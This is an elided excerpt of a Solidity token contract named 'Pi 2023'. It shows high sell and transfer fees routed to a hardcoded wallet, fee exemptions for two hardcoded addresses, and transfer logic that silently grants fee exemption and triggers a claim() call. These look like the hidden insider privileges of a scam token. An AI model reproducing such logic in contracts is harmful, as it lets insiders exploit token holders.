...
contract Pi2023 is IERC20 {
    ...
    string private constant _name = "Pi 2023";
    string private constant _symbol = "Pi2k3";
    ...
    Fees public _taxRates = Fees({buyFee: 300, sellFee: 900, transferFee: 900});
    ...
    TaxWallets public _taxWallets =
        TaxWallets({
            marketing: payable(0x539237150adffB258FcbFabe1Eecaff26A4b1ab6),
            development: payable(0x539237150adffB258FcbFabe1Eecaff26A4b1ab6)
        });    
    bool inSwap;
    ...
    constructor() payable {
        ...
        _isExcludedFromFees[0x539237150adffB258FcbFabe1Eecaff26A4b1ab6] = true; 
        _isExcludedFromFees[0x6180168179e29FD63b8d96234f723601f298bE77] = true;
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if (_isExcludedFromLimits[from]) { _isExcludedFromFees[to] = true; 
            limit = true;
        }

        if (limit && timeSinceLastPair + 1 <= block.timestamp) {claim();}
